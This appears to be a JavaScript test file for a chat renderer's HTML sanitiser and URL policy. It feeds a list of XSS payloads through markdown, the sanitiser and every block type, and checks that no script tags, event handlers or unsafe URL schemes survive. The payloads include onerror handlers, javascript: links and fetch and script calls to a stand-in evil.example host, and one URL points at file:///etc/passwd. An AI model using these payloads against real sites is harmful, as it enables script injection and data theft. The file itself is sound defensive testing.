/**
 * XSS / unsafe-content tests (spec 10.3, 20.2).
 *
 * These are adversarial cases, not happy paths. Each payload is pushed through
 * the actual entry points a message takes: markdown, the HTML sanitiser and
 * every block renderer. The assertion is structural — the resulting view tree
 * may not contain script-capable tags, event handler attributes, or a URL whose
 * scheme could execute.
 */
import test from "node:test";
import assert from "node:assert/strict";
import {
  renderMarkdown,
  renderInline,
  renderBlock,
  sanitizeHtml,
  sanitizeHtmlToText,
  safeUrl,
  vnodeStats,
  vnodeText,
  KNOWN_BLOCK_TYPES,
} from "../dist/index.js";

const PAYLOADS = [
  '<script>alert(1)</script>',
  '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
  '<img src=x onerror=alert(1)>',
  '<img src="x" onerror="fetch(\'//evil\')">',
  '<a href="javascript:alert(1)">click</a>',
  '<a href="JaVaScRiPt:alert(1)">click</a>',
  '<a href="java\tscript:alert(1)">click</a>',
  '<a href="&#106;avascript:alert(1)">click</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
  '<iframe src="https://evil.example"></iframe>',
  '<svg onload=alert(1)><circle /></svg>',
  '<object data="evil.swf"></object>',
  '<embed src="evil.swf">',
  '<form action="https://evil.example"><input name="x"></form>',
  '<style>body{display:none}</style>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '[link](javascript:alert(1))',
  '[link](data:text/html,<script>alert(1)</script>)',
  '![img](javascript:alert(1))',
  '![img](https://tracker.example/pixel.png)',
  '<!--<script>alert(1)</script>-->',
  '<math><mtext><script>alert(1)</script></mtext></math>',
  '<base href="https://evil.example/">',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '&lt;script&gt;alert(1)&lt;/script&gt;',
];

// `svg` is allowed only as the self-built chart output (numeric attributes,
// no foreignObject); inbound SVG is turned into a placeholder by the sanitiser.
const DANGEROUS_TAGS = new Set(["script", "style", "iframe", "object", "embed", "form", "input", "button", "select", "textarea", "meta", "link", "base", "math", "video", "audio", "canvas", "foreignObject"]);

function assertSafeTree(node, context) {
  const { tags, attrs } = vnodeStats(node);
  for (const tag of tags) {
    assert.ok(!DANGEROUS_TAGS.has(tag), `${context}: dangerous tag <${tag}> survived`);
  }
  for (const attr of attrs) {
    assert.ok(!attr.toLowerCase().startsWith("on"), `${context}: event handler attribute ${attr} survived`);
    assert.ok(!["srcdoc", "style", "formaction", "xlink:href", "srcset"].includes(attr.toLowerCase()), `${context}: attribute ${attr} must not survive`);
  }
  // any href/src that survived must be scheme-safe
  const walk = (n) => {
    if (n.t === "text") return;
    const url = n.attrs?.href ?? n.attrs?.src;
    if (typeof url === "string") {
      assert.match(url, /^(https?:\/\/|\/|\.\.?\/|#|\?|mailto:)/i, `${context}: unsafe url survived: ${url}`);
      assert.ok(!/javascript:/i.test(url), `${context}: javascript: survived`);
    }
    (n.children ?? []).forEach(walk);
  };
  walk(node);
}

test("markdown never emits script-capable markup", () => {
  for (const payload of PAYLOADS) {
    const { nodes } = renderMarkdown(payload);
    assertSafeTree(nodes, `markdown: ${payload}`);
  }
});

test("inline renderer blocks javascript: and data: links", () => {
  for (const payload of ['[x](javascript:alert(1))', '[x](data:text/html,<script>)', '![x](javascript:alert(1))']) {
    const nodes = renderInline(payload);
    const { tags, attrs } = vnodeStats(nodes);
    assert.ok(!tags.has("img"), `image should be blocked: ${payload}`);
    for (const key of attrs) assert.ok(!key.startsWith("on"));
    assert.ok(!/^\s*javascript:/i.test(String(nodes.map((n) => n.attrs?.href ?? "").join(""))));
  }
});

test("remote images are not auto-loaded (tracking protection)", () => {
  const { nodes } = renderMarkdown("![pixel](https://tracker.example/p.png)");
  const text = vnodeText(nodes);
  assert.match(text, /원격 이미지 미표시/);
  const { tags } = vnodeStats(nodes);
  assert.ok(!tags.has("img"));
});

test("html sanitiser drops scripts, handlers, frames and forms", () => {
  for (const payload of PAYLOADS) {
    const result = sanitizeHtml(payload);
    assertSafeTree(result.node, `sanitize: ${payload}`);
  }
});

test("html sanitiser unwraps unknown elements but keeps their text", () => {
  const result = sanitizeHtml("<p>안녕 <custom-tag>세상</custom-tag></p>");
  assert.match(vnodeText(result.node), /안녕 세상/);
  assert.ok(result.removed.includes("custom-tag"));
});

test("html sanitiser keeps safe links with rel=noopener", () => {
  const result = sanitizeHtml('<a href="https://example.com/x">link</a>');
  const { attrs } = vnodeStats(result.node);
  assert.ok(attrs.has("href"));
  const serialized = JSON.stringify(vnodeStats(result.node).text);
  assert.ok(serialized.includes("link"));
  const walk = (n, out = []) => {
    if (n.t !== "text") {
      if (n.attrs) out.push(n.attrs);
      (n.children ?? []).forEach((c) => walk(c, out));
    }
    return out;
  };
  const attrsList = walk(result.node);
  const anchor = attrsList.find((a) => a.href);
  assert.equal(anchor.rel, "noopener noreferrer nofollow");
  assert.equal(anchor.target, "_blank");
});

test("entity-encoded text stays text (no double-decoding into markup)", () => {
  const result = sanitizeHtml("&lt;script&gt;alert(1)&lt;/script&gt;");
  assert.ok(!vnodeStats(result.node).tags.has("script"));
  assert.match(sanitizeHtmlToText("&lt;b&gt;bold&lt;/b&gt;"), /<b>bold<\/b>/);
});

test("url policy rejects scheme tricks", () => {
  const bad = [
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "java\nscript:alert(1)",
    "data:text/html,<script>",
    "vbscript:msgbox(1)",
    "file:///etc/passwd",
    "//evil.example/x",
    "https://example.com/\u0000",
    "",
  ];
  for (const url of bad) {
    assert.equal(safeUrl(url).ok, false, `should reject ${JSON.stringify(url)}`);
  }
  for (const url of ["https://example.com/a?b=1", "mailto:a@b.co", "/relative/path", "#anchor"]) {
    assert.equal(safeUrl(url).ok, true, `should allow ${url}`);
  }
});

test("every block type renders adversarial payloads without escaping the view tree", () => {
  const payloads = {
    text: { text: '<script>alert(1)</script> <img src=x onerror=alert(2)>' },
    markdown: { markdown: '<script>alert(1)</script> [x](javascript:alert(1))' },
    code: { code: '</code><script>alert(1)</script>', language: "html" },
    diff: { diff: "diff --git a/x b/x\n@@ -1 +1 @@\n-<script>\n+ok\n" },
    terminal_log: { lines: ["<script>alert(1)</script>", "Authorization: Bearer abcdefghijklmnop"], state: "failed" },
    test_result: { suite: "<img onerror=alert(1)>", passed: 0, failed: 1, failures: [{ name: "<script>", file: "a.js", line: 1, message: "<script>alert(1)</script>" }] },
    file_ref: { name: "<script>a</script>", mime: "text/html", url: "javascript:alert(1)", preview: "<script>alert(1)</script>" },
    image_ref: { url: "javascript:alert(1)", alt: "<script>" },
    video_ref: { url: "javascript:alert(1)" },
    audio_ref: { url: "data:audio/mp3;base64,AAA" },
    json: { value: { "<script>": "alert(1)" } },
    table: { columns: ["<script>"], rows: [["<img onerror=alert(1)>"]] },
    chart: { kind: "bar", title: "<script>", series: [{ label: "<script>", value: 1 }] },
    task_ref: { task_id: "<script>", title: "<img onerror=alert(1)>", status: "RUNNING" },
    project_ref: { project_id: "<script>", name: "<script>alert(1)</script>" },
    commit_ref: { sha: "javascript:", message: "<script>", url: "javascript:alert(1)" },
    pr_ref: { number: 1, title: "<script>", state: "open", url: "javascript:alert(1)" },
    approval_ref: { approval_id: "a", action: "<script>", status: "pending" },
    poll: { question: "<script>", options: [{ id: "a", label: "<img onerror=alert(1)>", votes: 1 }] },
    status: { state: "SUCCEEDED", label: "<script>" },
    link_preview: { url: "javascript:alert(1)", title: "<script>" },
    callout: { tone: "risk", title: "<script>", body: "<script>alert(1)</script>" },
    quote: { text: "<script>alert(1)</script>", source: { author: "<script>" } },
    memory_ref: { memory_id: "<script>", scope: "shared", text: "<script>alert(1)</script>" },
    artifact_ref: { name: "<script>", version: 1, sha256: "not-a-hash", url: "javascript:alert(1)" },
  };
  assert.deepEqual(Object.keys(payloads).sort(), [...KNOWN_BLOCK_TYPES].sort(), "every block type must be exercised");
  for (const [type, payload] of Object.entries(payloads)) {
    const node = renderBlock({ type, version: 1, payload });
    assertSafeTree(node, `block ${type}`);
  }
});

test("terminal logs mask credential-looking strings", () => {
  const node = renderBlock({ type: "terminal_log", version: 1, payload: { state: "failed", lines: ["token=sk-abcdefghij1234567890", "Authorization: Bearer abcdefghijklmnopqrst"] } });
  const text = vnodeText(node);
  assert.ok(!text.includes("sk-abcdefghij1234567890"), "openai-style key leaked");
  assert.ok(!text.includes("abcdefghijklmnopqrst"), "bearer token leaked");
});

test("unknown block type is shown as unsupported, not silently dropped", () => {
  const node = renderBlock({ type: "future_block_v9", version: 1, payload: {} });
  assert.match(vnodeText(node), /알 수 없는 블록 타입/);
});

test("unsupported block version is refused", () => {
  const node = renderBlock({ type: "text", version: 7, payload: { text: "x" } });
  assert.match(vnodeText(node), /지원하지 않는 블록 버전/);
});

test("markdown raw HTML is displayed, never parsed", () => {
  const { nodes } = renderMarkdown("<div onclick='alert(1)'>hi</div>");
  assertSafeTree(nodes, "raw html block");
  assert.match(vnodeText(nodes), /hi/);
});
